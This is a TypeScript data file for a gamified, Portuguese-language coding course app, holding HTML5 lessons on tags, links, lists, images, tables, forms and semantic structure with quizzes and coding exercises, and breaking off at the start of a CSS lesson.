import type { LessonExercise } from '@/types';

export interface Lesson {
  id: string;
  title: string;
  description: string;
  content: string;
  codeExample?: string;
  language: string;
  duration: number;
  xpReward: number;
  exercises?: LessonExercise[];
}

export interface Course {
  id: string;
  slug: string;
  name: string;
  planetName: string;
  description: string;
  icon: string;
  color: string;
  language: string;
  level: 'Iniciante' | 'Intermediário' | 'Avançado';
  totalXp: number;
  lessons: Lesson[];
}

export const COURSES: Course[] = [
  {
    "id": "html",
    "slug": "html",
    "name": "HTML5",
    "planetName": "Terra Digital",
    "description": "Aprenda a estruturar websites do absoluto zero até a semântica moderna.",
    "icon": "🌐",
    "color": "#00D4FF",
    "language": "html",
    "level": "Iniciante",
    "totalXp": 490,
    "lessons": [
      {
        "id": "html-1",
        "title": "1. O que é HTML & Anatomia da Web",
        "description": "Descubra como a internet funciona, a diferença entre linguagens e a estrutura mestra de um site.",
        "duration": 12,
        "xpReward": 50,
        "language": "html",
        "content": "# 🌐 Introdução ao HTML & Anatomia da Web\n\nBem-vindo à **Terra Digital**, cadete! Aqui começa a sua jornada para se tornar uma lenda do código.\n\n> **💡 O que é HTML?**\n> **HTML** significa *HyperText Markup Language* (Linguagem de Marcação de Hipertexto). Diferente do JavaScript ou Python, o HTML **não é uma linguagem de programação** — ele não faz cálculos matemáticos nem toma decisões lógicas. Ele é a **espinha dorsal** que define o que existe na página: onde fica o cabeçalho, os textos, os botões e as imagens.\n\n---\n\n### 🧩 A Anatomia de uma Tag HTML\n\nQuase tudo no HTML é formado por **tags** que abrem e fecham em volta de um conteúdo:\n\n```html\n<tagname atributo=\"valor\">Conteúdo que aparece na tela</tagname>\n```\n\n- **Tag de abertura:** `<p>` indica o início de um elemento (como um parágrafo).\n- **Conteúdo:** O texto ou outros elementos que ficam dentro.\n- **Tag de fechamento:** `</p>` indica o fim do elemento (note a barra `/`).\n\n---\n\n### 🏗️ A Estrutura Mestra Obrigatória\n\nTodo documento HTML moderno segue este esqueleto inicial:\n\n```html\n<!DOCTYPE html>\n<html lang=\"pt-BR\">\n  <head>\n    <meta charset=\"UTF-8\">\n    <title>Minha Primeira Página no Nexus</title>\n  </head>\n  <body>\n    <h1>Olá, Mundo Cyberpunk!</h1>\n    <p>Este é o meu primeiro passo no universo do desenvolvimento web.</p>\n  </body>\n</html>\n```\n\n- `<!DOCTYPE html>`: Informa ao navegador que estamos usando a versão mais recente (**HTML5**).\n- `<html>`: A tag raiz que engloba todo o documento.\n- `<head>`: O \"cérebro invisível\" da página — contém o título da aba (`<title>`), fontes e configurações de caracteres (`UTF-8`).\n- `<body>`: O corpo visível — **tudo o que o usuário enxerga e interage na tela fica aqui dentro!**",
        "codeExample": "<!DOCTYPE html>\n<html lang=\"pt-BR\">\n  <head>\n    <meta charset=\"UTF-8\">\n    <title>Nexus Academy</title>\n  </head>\n  <body>\n    <h1>Base de Treinamento</h1>\n    <p>Cadete conectado com sucesso!</p>\n  </body>\n</html>",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é a função primordial do HTML na arquitetura de um website?",
            "options": [
              "Definir a estrutura semântica e os blocos de conteúdo da página.",
              "Calcular a lógica de negócios e conectar com o banco de dados diretamente.",
              "Aplicar sombras 3D, animações dinâmicas e cores na interface.",
              "Gerenciar a velocidade de download e a segurança da rede Wi-Fi."
            ],
            "correctIndex": 0,
            "explanation": "O HTML é responsável exclusivamente pela estrutura e conteúdo. A estilização visual é papel do CSS e a interatividade lógica pertence ao JavaScript."
          },
          {
            "type": "code",
            "instruction": "Crie um título principal <h1> dizendo \"Base Nexus\" e logo abaixo um parágrafo <p> com o texto \"Sistema inicializado\".",
            "initialCode": "<!-- Digite aqui o título <h1> e o parágrafo <p> -->\n",
            "expectedKeywords": [
              "<h1>",
              "</h1>",
              "Base Nexus",
              "<p>",
              "</p>",
              "Sistema inicializado"
            ],
            "hint": "Use <h1>Texto do Título</h1> para criar o título principal e <p>Texto do Parágrafo</p> para criar o parágrafo.",
            "solution": "<h1>Base Nexus</h1>\n<p>Sistema inicializado</p>"
          }
        ]
      },
      {
        "id": "html-2",
        "title": "2. Títulos, Parágrafos & Formatação Semântica",
        "description": "Aprenda a hierarquia de títulos de h1 a h6 e como dar ênfase visual e semântica aos textos.",
        "duration": 15,
        "xpReward": 55,
        "language": "html",
        "content": "# ✍️ Títulos, Parágrafos & Formatação Semântica\n\nNa web moderna, a forma como você organiza os textos importa tanto para os humanos quanto para os motores de busca (como o Google) e leitores de tela para pessoas com deficiência visual.\n\n---\n\n### 👑 Hierarquia de Títulos (h1 até h6)\n\nO HTML fornece seis níveis de títulos:\n\n```html\n<h1>Título de Nível 1 — O mais importante</h1>\n<h2>Título de Nível 2 — Seções principais</h2>\n<h3>Título de Nível 3 — Subseções</h3>\n<h4>Título de Nível 4</h4>\n<h5>Título de Nível 5</h5>\n<h6>Título de Nível 6 — O menor nível</h6>\n```\n\n> **⚠️ Regra de Ouro da Web:**\n> Você deve ter **apenas um único `<h1>` por página**! Ele representa o assunto principal daquele documento. Para subseções, use `<h2>` e `<h3>`. Nunca pule níveis (por exemplo, de `<h1>` direto para `<h4>`).\n\n---\n\n### 📝 Parágrafos e Quebras\n\n- `<p>`: Define um bloco de parágrafo com espaçamento automático antes e depois.\n- `<br>`: Quebra de linha simples sem iniciar um novo parágrafo (é uma tag auto-fechável, sem `</br>`).\n- `<hr>`: Linha divisória horizontal entre tópicos.\n\n---\n\n### 🎯 Ênfase Semântica: `<strong>` vs `<em>`\n\n- `<strong>`: Indica que o texto tem **alta importância ou urgência** (visualmente fica em negrito e leitores de tela alteram o tom de voz).\n- `<em>`: Indica **ênfase e entonação** (visualmente fica em itálico).\n- `<mark>`: Destaca o texto como se fosse um marca-texto neon!",
        "codeExample": "<h1>Relatório da Missão Orion</h1>\n<h2>Setor 7: Varredura Completa</h2>\n<p>Os radares detectaram uma anomalia <strong>crítica</strong> nas coordenadas externas.</p>\n<p>A equipe precisa agir com <em>máxima cautela</em>.</p>",
        "exercises": [
          {
            "type": "quiz",
            "question": "Por que é uma boa prática manter apenas uma tag <h1> por página web?",
            "options": [
              "Porque melhora o SEO (Google) e ajuda softwares de acessibilidade a identificar o tema principal.",
              "Porque o navegador gera um erro fatal de sintaxe se houver mais de um.",
              "Porque as tags h2 e h3 são desativadas caso existam dois títulos h1.",
              "Porque apenas designers com permissão de administrador podem usar mais de um."
            ],
            "correctIndex": 0,
            "explanation": "O <h1> é a manchete principal da página. Ter apenas um facilita a leitura de robôs de busca (SEO) e leitores de tela usados por pessoas com deficiência."
          },
          {
            "type": "code",
            "instruction": "Crie um subtítulo <h2> com o texto \"Aeronaves\" e abaixo um parágrafo <p> com \"Status: \" seguido da palavra \"URGENTE\" dentro da tag <strong>.",
            "initialCode": "<!-- Digite aqui o subtítulo <h2> e o parágrafo <p> com <strong> -->\n",
            "expectedKeywords": [
              "<h2>",
              "</h2>",
              "Aeronaves",
              "<p>",
              "</p>",
              "<strong>",
              "</strong>",
              "URGENTE"
            ],
            "hint": "Abra a tag <h2>, digite Aeronaves e feche com </h2>. Logo abaixo abra <p>, digite Status: e envolva a palavra URGENTE com as tags <strong> e </strong> antes de fechar o parágrafo.",
            "solution": "<h2>Aeronaves</h2>\n<p>Status: <strong>URGENTE</strong></p>"
          }
        ]
      },
      {
        "id": "html-3",
        "title": "3. Links, Hipertexto & Atributos de Navegação",
        "description": "Conecte páginas com a tag <a>, o atributo href e configurações de segurança ao abrir nova aba.",
        "duration": 15,
        "xpReward": 60,
        "language": "html",
        "content": "# 🔗 Hiperlinks & A Teia da Web\n\nO que torna a Web uma rede mundial interconectada é o **Hipertexto** — a capacidade de clicar em uma palavra e viajar instantaneamente para outra página ou documento.\n\n---\n\n### 🌐 A Tag Âncora: `<a>`\n\nPara criar um link, usamos a tag `<a>` (de *anchor*) acompanhada do atributo obrigatório **`href`** (*Hypertext Reference*):\n\n```html\n<a href=\"https://google.com\">Acessar o Google</a>\n```\n\n---\n\n### 🚀 Abrindo em uma Nova Aba com Segurança\n\nQuando queremos que o link abra em uma nova aba do navegador, adicionamos o atributo `target=\"_blank\"`:\n\n```html\n<a href=\"https://github.com\" target=\"_blank\" rel=\"noopener noreferrer\">\n  Ver Repositório no GitHub\n</a>\n```\n\n> **🛡️ Segurança Profissional (Tabnabbing):**\n> Sempre que usar `target=\"_blank\"`, adicione também `rel=\"noopener noreferrer\"`. Isso impede que a página de destino maliciosa assuma o controle da sua aba de origem através do JavaScript (`window.opener`).\n\n---\n\n### 📍 Links Internos (Âncoras na Mesma Página)\n\nVocê pode criar links que rolam a página até uma seção específica usando o `id` do elemento:\n\n```html\n<!-- O link aponta para o ID -->\n<a href=\"#contato\">Ir para Contato</a>\n\n<!-- O destino que tem o ID correspondente -->\n<section id=\"contato\">\n  <h2>Fale Conosco</h2>\n</section>\n```",
        "codeExample": "<nav>\n  <a href=\"#inicio\">Início</a> |\n  <a href=\"#planetas\">Planetas</a> |\n  <a href=\"https://github.com\" target=\"_blank\" rel=\"noopener noreferrer\">GitHub</a>\n</nav>",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual atributo é responsável por informar o endereço de destino (URL) em um link <a>?",
            "options": [
              "href (Hypertext Reference)",
              "src (Source)",
              "link (Link Pointer)",
              "to (Target Location)"
            ],
            "correctIndex": 0,
            "explanation": "O atributo correto é \"href\". O atributo \"src\" é utilizado em mídias como imagens (<img>) e scripts (<script>)."
          },
          {
            "type": "code",
            "instruction": "Crie um link <a> apontando para \"https://codequest.nexus\" com o texto \"Entrar no Nexus\" e com target=\"_blank\".",
            "initialCode": "<!-- Crie seu link <a> abaixo -->\n",
            "expectedKeywords": [
              "<a",
              "href=",
              "https://codequest.nexus",
              "target=\"_blank\"",
              "Entrar no Nexus",
              "</a>"
            ],
            "hint": "A sintaxe de uma âncora é: <a href=\"URL\" target=\"_blank\">Texto</a> fechando com </a>.",
            "solution": "<a href=\"https://codequest.nexus\" target=\"_blank\">Entrar no Nexus</a>"
          }
        ]
      },
      {
        "id": "html-4",
        "title": "4. Listas Ordenadas, Não Ordenadas & Menus",
        "description": "Organize itens, inventários e menus estruturados com as tags ul, ol e li.",
        "duration": 12,
        "xpReward": 60,
        "language": "html",
        "content": "# 📋 Listas Ordenadas, Não Ordenadas & Menus\n\nListas são fundamentais na construção de páginas web. Na verdade, quase todo **menu de navegação**, **lista de produtos** e **feed de postagens** que você vê na internet é construído com listas HTML!\n\n---\n\n### 🟣 Listas Não Ordenadas: `<ul>`\n\nUsadas quando a sequência dos itens não importa (geram bolinhas / bullets):\n\n```html\n<ul>\n  <li>Capacete Espacial</li>\n  <li>Tanque de Oxigênio</li>\n  <li>Propulsor de Íons</li>\n</ul>\n```\n\n- `<ul>` = *Unordered List* (Lista Não Ordenada)\n- `<li>` = *List Item* (Item de Lista — obrigatório dentro de `<ul>` ou `<ol>`)\n\n---\n\n### 🔢 Listas Ordenadas: `<ol>`\n\nUsadas quando a ordem dos fatores é crucial (geram numeração automática 1, 2, 3...):\n\n```html\n<ol>\n  <li>Ligar os motores da nave</li>\n  <li>Calibrar as coordenadas do Nexus</li>\n  <li>Iniciar salto no hiperespaço</li>\n</ol>\n```\n\n---\n\n### 💡 Transformando Listas em Menus de Navegação\n\nNa indústria, agrupamos links dentro de listas para manter a acessibilidade semântica:\n\n```html\n<nav>\n  <ul>\n    <li><a href=\"/\">Dashboard</a></li>\n    <li><a href=\"/galaxy\">Galáxia</a></li>\n    <li><a href=\"/profile\">Perfil</a></li>\n  </ul>\n</nav>\n```",
        "codeExample": "<h3>Habilidades do Programador</h3>\n<ul>\n  <li>HTML5 Semântico</li>\n  <li>CSS3 & Responsividade</li>\n  <li>JavaScript Moderno</li>\n</ul>",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual tag representa um item individual dentro de uma lista (seja ordenada ou não)?",
            "options": [
              "<li> (List Item)",
              "<item> (Item Element)",
              "<ul> (Unordered List)",
              "<list> (List Container)"
            ],
            "correctIndex": 0,
            "explanation": "A tag <li> (List Item) é a única filha direta válida para as tags <ul> e <ol>."
          },
          {
            "type": "code",
            "instruction": "Crie uma lista não ordenada (<ul>) contendo 3 itens (<li>): \"HTML5\", \"CSS3\" e \"JavaScript\".",
            "initialCode": "<!-- Crie sua lista não ordenada <ul> com 3 itens <li> aqui -->\n",
            "expectedKeywords": [
              "<ul>",
              "</ul>",
              "<li>",
              "</li>",
              "HTML5",
              "CSS3",
              "JavaScript"
            ],
            "hint": "Abra a tag <ul>, insira cada um dos três itens envolvidos por <li> e </li>, e finalize fechando com </ul>.",
            "solution": "<ul>\n  <li>HTML5</li>\n  <li>CSS3</li>\n  <li>JavaScript</li>\n</ul>"
          }
        ]
      },
      {
        "id": "html-5",
        "title": "5. Imagens, Mídia & Acessibilidade Web",
        "description": "Adicione imagens na página com a tag <img>, entenda caminhos relativos e a importância vital do atributo alt.",
        "duration": 15,
        "xpReward": 65,
        "language": "html",
        "content": "# 🖼️ Imagens, Mídia & Acessibilidade Web\n\nUma imagem vale mais que mil palavras, e na web ela precisa ser rápida, responsiva e inclusiva para todos os usuários.\n\n---\n\n### 👁️ A Tag de Imagem: `<img>`\n\nDiferente de parágrafos ou títulos, a tag `<img>` é um **elemento vazio** (*void element* ou *self-closing*). Ela **não possui tag de fechamento** (`</img>` não existe!):\n\n```html\n<img src=\"https://exemplo.com/foto.jpg\" alt=\"Descrição da imagem\" width=\"300\" height=\"200\" />\n```\n\n---\n\n### 🔑 Os Dois Atributos Obrigatórios\n\n1. **`src` (*Source*):** O caminho onde a imagem está salva. Pode ser:\n   - Um link externo na internet (`https://...`).\n   - Um arquivo local do seu projeto (`./imagens/avatar.png`).\n2. **`alt` (*Alternative Text*):** O texto alternativo descritivo.\n\n> **❤️ Por que o `alt` é indispensável?**\n> 1. **Acessibilidade:** Pessoas com deficiência visual utilizam programas leitores de tela que leem o texto do `alt` em voz alta.\n> 2. **Falhas de Conexão:** Se a imagem não puder ser baixada por instabilidade na rede, o texto do `alt` aparece no lugar para o usuário entender o contexto.\n> 3. **SEO:** Mecanismos de busca indexam o conteúdo visual através do texto alternativo.\n\n---\n\n### 📏 Dimensões: `width` e `height`\n\nVocê pode especificar a largura (`width`) e altura (`height`) em pixels para evitar que a página \"dê saltos\" visuais (*Cumulative Layout Shift*) enquanto a imagem está carregando.",
        "codeExample": "<figure>\n  <img \n    src=\"https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=400\" \n    alt=\"Arte abstrata com tons de azul e roxo neon\" \n    width=\"400\" \n  />\n  <figcaption>Arte futurista gerada para o CodeQuest Nexus</figcaption>\n</figure>",
        "exercises": [
          {
            "type": "quiz",
            "question": "Por que a tag <img> não precisa de tag de fechamento como </img>?",
            "options": [
              "Porque é um elemento vazio (void element), cujo conteúdo e propriedades são passados através de atributos.",
              "Porque foi criada recentemente no HTML5 e as versões antigas exigiam fechamento.",
              "Porque as imagens são renderizadas fora da estrutura do navegador.",
              "Na verdade é obrigatório fechar com </img> em páginas publicadas."
            ],
            "correctIndex": 0,
            "explanation": "Elementos como <img>, <br>, <hr> e <input> não contêm texto interno entre duas tags, por isso não possuem tag de fechamento."
          },
          {
            "type": "code",
            "instruction": "Adicione uma tag <img> com src=\"https://picsum.photos/300/200\" e o atributo alt=\"Robô astronauta navegando no espaço\".",
            "initialCode": "<!-- Adicione a tag de imagem abaixo -->\n",
            "expectedKeywords": [
              "<img",
              "src=",
              "https://picsum.photos/300/200",
              "alt=",
              "Robô astronauta navegando no espaço"
            ],
            "hint": "Utilize a tag de imagem informando a URL na propriedade src e uma descrição textual acessível no atributo alt.",
            "solution": "<img src=\"https://picsum.photos/300/200\" alt=\"Robô astronauta navegando no espaço\" />"
          }
        ]
      },
      {
        "id": "html-6",
        "title": "6. Tabelas de Dados & Matrizes Estruturadas",
        "description": "Construa grades de dados robustas com table, thead, tbody, th e td para exibir informações complexas.",
        "duration": 15,
        "xpReward": 65,
        "language": "html",
        "content": "# 📊 Tabelas de Dados & Matrizes Estruturadas\n\nSaudações, cadete da Terra Digital! Na gestão de frotas e inventários espaciais, exibir dados organizados em linhas e colunas é uma habilidade indispensável.\n\n> **💡 O que são Tabelas no HTML?**\n> A tag `<table>` permite criar grades bidimensionais formadas por linhas (`<tr>`) e células (`<td>` ou `<th>`). Elas são destinadas exclusivamente a **dados tabulares**, como relatórios financeiros, estatísticas de naves e listas de telemetria.\n\n---\n\n### 🧩 A Anatomia Semântica de uma Tabela\n\nTabelas profissionais utilizam divisões semânticas para diferenciar títulos e dados:\n\n```html\n<table>\n  <thead>\n    <tr>\n      <th>Planeta</th>\n      <th>Gravidade</th>\n      <th>Status</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td>Terra Digital</td>\n      <td>1.0G</td>\n      <td>Habitável</td>\n    </tr>\n    <tr>\n      <td>Neon City</td>\n      <td>0.8G</td>\n      <td>Urbano</td>\n    </tr>\n  </tbody>\n</table>\n```\n\n- `<thead>`: Cabeçalho da tabela contendo os títulos das colunas.\n- `<tbody>`: Corpo principal onde residem os registros e dados tabulares.\n- `<tr>` (*table row*): Linha da tabela.\n- `<th>` (*table header*): Célula de cabeçalho (em negrito e centralizada por padrão).\n- `<td>` (*table data*): Célula de dado comum.\n\n> **⚠️ Armadilha Comum:**\n> Nunca utilize `<table>` para desenhar o layout geral da página! Essa era uma prática dos anos 1990 que quebra a acessibilidade, o SEO e o design responsivo em dispositivos móveis. Para layout, sempre use CSS (Flexbox e Grid).\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- `scope=\"col\"`: Adicione este atributo nas tags `<th>` para facilitar a leitura por softwares de acessibilidade.\n- `<caption>`: Adicione um título descritivo logo após a abertura da `<table>` para contexto rápido.\n\n> **🛡️ Regra de Ouro:**\n> Toda tabela com dados para humanos precisa de pelo menos uma linha de cabeçalho (`<th>`) claramente identificável.",
        "codeExample": "<table>\n  <caption>Relatório de Cargas da Frota</caption>\n  <thead>\n    <tr>\n      <th scope=\"col\">Módulo</th>\n      <th scope=\"col\">Status</th>\n      <th scope=\"col\">Integridade</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td>Propulsor Alfa</td>\n      <td>Online</td>\n      <td>98%</td>\n    </tr>\n  </tbody>\n</table>",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual tag HTML define uma célula de cabeçalho dentro de uma linha de tabela?",
            "options": [
              "<td>",
              "<head>",
              "<th>",
              "<header>"
            ],
            "correctIndex": 2,
            "explanation": "A tag <th> (table header) representa células de cabeçalho, enquanto <td> representa dados comuns (table data)."
          },
          {
            "type": "code",
            "instruction": "Crie uma tabela com um cabeçalho <thead> contendo uma linha com dois títulos <th>: \"Item\" e \"Quantidade\".",
            "initialCode": "<!-- Crie aqui a tabela com o thead, tr e os th -->\n",
            "expectedKeywords": [
              "<table>",
              "<thead>",
              "<tr>",
              "<th>Item</th>",
              "<th>Quantidade</th>",
              "</tr>",
              "</thead>",
              "</table>"
            ],
            "hint": "Abra a tag <table>, insira o <thead> com um <tr> interno e duas tags <th> com os nomes pedidos.",
            "solution": "<table>\n  <thead>\n    <tr>\n      <th>Item</th>\n      <th>Quantidade</th>\n    </tr>\n  </thead>\n</table>"
          }
        ]
      },
      {
        "id": "html-7",
        "title": "7. Formulários Interativos & Validação de Entrada",
        "description": "Capture transmissões de usuários com forms, labels, inputs, selects e botões de envio seguros.",
        "duration": 16,
        "xpReward": 65,
        "language": "html",
        "content": "# 📝 Formulários Interativos & Validação de Entrada\n\nBem-vindo ao terminal de comunicação, cadete! Formulários são o canal direto através do qual usuários enviam dados para o seu sistema: logins, cadastros e pesquisas.\n\n> **💡 O que é a Tag <form>?**\n> O elemento `<form>` agrupa campos de entrada interativos e gerencia o envio dessas informações para um servidor web através de métodos como `POST` e `GET`.\n\n---\n\n### 🎛️ Campos Fundamentais e a Parceria <label> + <input>\n\nAcessibilidade é obrigatória: cada `<input>` precisa estar conectado a uma `<label>`:\n\n```html\n<form action=\"/login\" method=\"POST\">\n  <div>\n    <label for=\"cadete-id\">Identificação do Cadete:</label>\n    <input type=\"text\" id=\"cadete-id\" name=\"username\" required placeholder=\"Ex: Alex-702\" />\n  </div>\n\n  <div>\n    <label for=\"senha-acesso\">Código de Acesso:</label>\n    <input type=\"password\" id=\"senha-acesso\" name=\"password\" required />\n  </div>\n\n  <button type=\"submit\">Autenticar na Frota</button>\n</form>\n```\n\n- **`type`**: Define o comportamento do input (`text`, `password`, `email`, `number`, `checkbox`, `radio`).\n- **`for` e `id`**: O atributo `for` da `<label>` deve corresponder exatamente ao `id` do `<input>`. Ao clicar no texto do label, o campo recebe foco automaticamente!\n- **`required`**: Validação nativa do navegador que impede envio se o campo estiver vazio.\n\n> **⚠️ Armadilha Comum:**\n> Esquecer o atributo `name` no input! Sem o `name`, o navegador simplesmente ignora o dado preenchido e não envia esse valor na requisição HTTP.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Sempre use `type=\"email\"` para e-mails: os teclados móveis já mostram o botão de `@` automaticamente.\n- Defina `type=\"button\"` caso o botão dentro de um formulário não sirva para submissão (evita disparos acidentais).\n\n> **🛡️ Regra de Ouro:**\n> Nunca substitua uma tag `<label>` por apenas um `placeholder`. Placeholders somem quando o usuário começa a digitar, deixando pessoas com problemas cognitivos desorientadas.",
        "codeExample": "<form action=\"/registro\" method=\"POST\">\n  <label for=\"email-cadete\">E-mail Estelar:</label>\n  <input type=\"email\" id=\"email-cadete\" name=\"email\" required placeholder=\"cadete@nexus.io\" />\n  <button type=\"submit\">Registrar</button>\n</form>",
        "exercises": [
          {
            "type": "quiz",
            "question": "Como associamos corretamente uma tag <label> com o seu respectivo <input> para garantir acessibilidade?",
            "options": [
              "Adicionando a mesma classe CSS (class=\"...\") em ambos os elementos.",
              "Fazendo o atributo \"for\" do label ter o mesmo valor do atributo \"id\" do input.",
              "Colocando o input obrigatoriamente antes do label no código HTML.",
              "Utilizando o atributo \"name\" com o mesmo texto em ambas as tags."
            ],
            "correctIndex": 1,
            "explanation": "O atributo for na tag <label> vincula-se ao atributo id do <input>, permitindo que leitores de tela identifiquem a descrição do campo e ampliando a área de clique."
          },
          {
            "type": "fillblank",
            "title": "Configurando um Input Obrigatório de E-mail",
            "instruction": "Complete as lacunas para criar um campo de e-mail obrigatório conectado à sua legenda correspondente.",
            "codeSnippet": "<label for=\"contato\">Canal de Contato:</label>\n<input type=\"___\" id=\"___\" name=\"email\" ___ />",
            "blanks": [
              {
                "id": "blank-1",
                "placeholder": "tipo",
                "expectedValues": [
                  "email"
                ],
                "hint": "Pense no tipo específico do HTML5 para endereços de correio eletrônico."
              },
              {
                "id": "blank-2",
                "placeholder": "identificador",
                "expectedValues": [
                  "contato"
                ],
                "hint": "O valor do id deve ser idêntico ao valor definido no atributo for do label acima."
              },
              {
                "id": "blank-3",
                "placeholder": "validação",
                "expectedValues": [
                  "required"
                ],
                "hint": "Atributo booleano que torna o preenchimento deste campo obrigatório."
              }
            ],
            "explanation": "Com type=\"email\", id=\"contato\" e required, o formulário valida o endereço e garante compatibilidade com leitores de tela."
          }
        ]
      },
      {
        "id": "html-8",
        "title": "8. Estrutura Semântica Moderna & Acessibilidade ARIA",
        "description": "Construa páginas completas usando header, nav, main, article, section, footer e marcos acessíveis.",
        "duration": 18,
        "xpReward": 70,
        "language": "html",
        "content": "# 🏛️ Estrutura Semântica Moderna & Acessibilidade ARIA\n\nMissão final do planeta Terra Digital! Chegou a hora de transformar blocos genéricos de divs em uma fortaleza semântica compreensível por qualquer robô de indexação ou sintetizador de voz.\n\n> **💡 O que é Semântica Web?**\n> Semântica significa dar significado ao código. Em vez de usar `<div>` para tudo, o HTML5 introduziu tags que descrevem com precisão a finalidade de cada setor da página na árvore de acessibilidade.\n\n---\n\n### 🗺️ O Mapa Semântico de uma Aplicação Web\n\n```html\n<!DOCTYPE html>\n<html lang=\"pt-BR\">\n  <head>\n    <meta charset=\"UTF-8\">\n    <title>Base de Operações Nexus</title>\n  </head>\n  <body>\n    <header>\n      <h1>CodeQuest Nexus</h1>\n      <nav aria-label=\"Navegação Principal\">\n        <a href=\"#missoes\">Missões</a>\n        <a href=\"#perfil\">Perfil</a>\n      </nav>\n    </header>\n\n    <main>\n      <section id=\"missoes\">\n        <h2>Missões Disponíveis</h2>\n        <article>\n          <h3>Operação Terra Digital</h3>\n          <p>Conclua os testes semânticos da academia.</p>\n        </article>\n      </section>\n\n      <aside>\n        <h3>Transmissões Recentes</h3>\n        <p>Alerta: tempestade solar no setor CSS.</p>\n      </aside>\n    </main>\n\n    <footer>\n      <p>&copy; 2026 CodeQuest Nexus - Todos os direitos reservados.</p>\n    </footer>\n  </body>\n</html>\n```\n\n- `<header>`: O topo da página ou seção, contendo logos, títulos e busca.\n- `<nav>`: Agrupamento de links essenciais de navegação.\n- `<main>`: O conteúdo principal e exclusivo da página (deve existir apenas um por tela!).\n- `<article>`: Um bloco autocontido que faria sentido mesmo se fosse lido isoladamente (ex: um post de blog, um card de produto).\n- `<section>`: Um agrupamento temático de conteúdo que geralmente possui seu próprio título `<h2>`.\n- `<aside>`: Informações secundárias e barras laterais tangencialmente relacionadas ao tema.\n- `<footer>`: O rodapé com créditos, termos legais e links institucionais.\n\n> **⚠️ Armadilha Comum:**\n> Substituir cegamente todas as `<div>` do projeto por `<section>`. Use `<div>` sempre que você precisar apenas de uma caixa estilística para fins de CSS sem significado semântico!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Use `aria-label` na tag `<nav>` quando tiver mais de uma barra de navegação (ex: uma no cabeçalho e outra no rodapé).\n- Respeite a ordem hierárquica dos cabeçalhos (`<h1>`, depois `<h2>`, depois `<h3>`), sem pular níveis.\n\n> **🛡️ Regra de Ouro:**\n> Deve existir exatamente um elemento `<main>` visível por página, e ele nunca deve ficar aninhado dentro de `<header>`, `<nav>` ou `<footer>`.",
        "codeExample": "<header>\n  <h1>Terminal Central</h1>\n  <nav aria-label=\"Primária\">\n    <a href=\"/dashboard\">Início</a>\n  </nav>\n</header>\n<main>\n  <article>\n    <h2>Relatório de Operação</h2>\n    <p>Todos os setores com integridade máxima.</p>\n  </article>\n</main>\n<footer>\n  <p>Status: Operacional</p>\n</footer>",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual elemento HTML5 semântico é indicado para envolver um conteúdo independente e autocontido, como um post de notícias ou uma avaliação de produto?",
            "options": [
              "<section>",
              "<aside>",
              "<article>",
              "<div>"
            ],
            "correctIndex": 2,
            "explanation": "<article> representa uma composição independente que pode ser distribuída ou reutilizada de forma autônoma."
          },
          {
            "type": "bughunt",
            "title": "Depuração da Estrutura de Navegação Semântica",
            "scenario": "Um cadete júnior aninhou a tag <main> dentro do cabeçalho da página e usou divs genéricas para links de navegação. Corrija o código tornando-o semântico.",
            "buggyCode": "<header>\n  <main>\n    <h1>Nexus Base</h1>\n    <div class=\"menu\">\n      <a href=\"/home\">Home</a>\n    </div>\n  </main>\n</header>",
            "expectedKeywords": [
              "<header>",
              "<nav>",
              "</nav>",
              "<main>",
              "</main>",
              "<h1>Nexus Base</h1>",
              "<a href=\"/home\">Home</a>"
            ],
            "forbiddenKeywords": [
              "<header>\n  <main>"
            ],
            "hint": "Separe o <header> do <main>. Dentro do <header>, utilize a tag semântica <nav> em vez de <div class=\"menu\">.",
            "solutionExplanation": "O <header> deve conter a marca e a <nav>. O elemento <main> deve ficar em nível superior logo após o <header>."
          }
        ]
      }
    ]
  },
  {
    "id": "css",
    "slug": "css",
    "name": "CSS3",
    "planetName": "Neon City",
    "description": "Transforme esqueletos cinzentos em interfaces futuristas com estilos e layout.",
    "icon": "🎨",
    "color": "#8B5CF6",
    "language": "css",
    "level": "Iniciante",
    "totalXp": 520,
    "lessons": [
      {
        "id": "css-1",
        "title": "1. O que é CSS & Sintaxe Estelar",
        "description": "Aprenda a conectar folhas de estilo, seletores de classe e propriedades visuais.",
        "duration": 14,
        "xpReward": 60,
        "language": "css",
        "content": "# 🎨 O que é CSS & Sintaxe Neon\n\nBem-vindo a **Neon City**, cadete! Se o HTML é a estrutura óssea do seu habitat espacial, o **CSS** (*Cascading Style Sheets*) é a pele, os circuitos iluminados e a atmosfera que dão vida ao universo digital.\n\n> **💡 O Papel do CSS:**\n> O CSS separa o conteúdo visual da marcação lógica. Com ele, você controla cores, tipografia, espaçamentos, animações e a adaptação do site para qualquer tamanho de tela (de relógios inteligentes a telas espaciais ultrawide).\n\n---\n\n### 🧩 Anatomia de uma Regra CSS\n\nUma regra CSS é composta por um **seletor** e um bloco de **declarações**:\n\n```css\nseletor {\n  propriedade: valor;\n}\n```\n\n- **Seletor:** Indica qual elemento HTML receberá o estilo (ex: `h1`, `.card`, `#menu`).\n- **Propriedade:** O aspecto que você deseja alterar (ex: `color`, `background-color`, `font-size`).\n- **Valor:** A definição aplicada (ex: `#00D4FF`, `16px`, `bold`).\n- **Ponto e vírgula (`;`):** Obrigatório ao final de cada declaração para evitar falhas em cadeia!\n\n---\n\n### 🎯 Tipos de Seletores Mais Comuns\n\n1. **Seletor de Elemento:** Afeta todas as tags daquele tipo:\n   ```css\n   p {\n     color: #E2E8F0;\n   }\n   ```\n2. **Seletor de Classe (`.`):** Reutilizável em múltiplos elementos. É o padrão da indústria:\n   ```css\n   .card-cyber {\n     background-color: #0B1120;\n     border: 1px solid #8B5CF6;\n   }\n   ```\n3. **Seletor de ID (`#`):** Específico para um único elemento único na página:\n   ```css\n   #painel-mestre {\n     padding: 24px;\n   }\n   ```\n\n> **⚠️ Armadilha Comum:**\n> Esquecer o ponto (`.`) ao estilizar uma classe no arquivo `.css` faz o navegador achar que você está estilizando uma tag HTML com aquele nome! Se sua classe é 